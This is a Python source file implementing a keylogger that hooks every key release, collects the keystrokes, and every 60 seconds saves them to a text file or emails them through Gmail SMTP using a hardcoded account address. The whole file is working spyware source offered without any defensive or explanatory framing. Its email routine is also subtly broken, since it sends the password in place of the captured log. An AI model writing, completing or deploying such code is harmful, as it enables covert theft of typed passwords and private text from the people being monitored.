import smtplib
import keyboard
import smtplib
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "jul00howell@gmail.com"
EMAIL_PASSWORD = "xxxx"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def call_back(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
    
    def report_to_file(self):
        with open(f"{self.filename}.txt","w") as f:
            print(self.log, file = f)

    def send_email(self, email, password, message):
        #establish a connection the SMTP server.
        server = smtplib.SMTP(host = "smtp.gmail.com", port = 587)
        #connect to the server in TLS mode.
        server.starttls()

        #log into the email address
        server.login(email,password)
        #send the email to itself
        server.sendmail(email, email, password)

        #terminate
        server.quit()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()

            if self.report_method == "email":
                self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            
            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.call_back)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
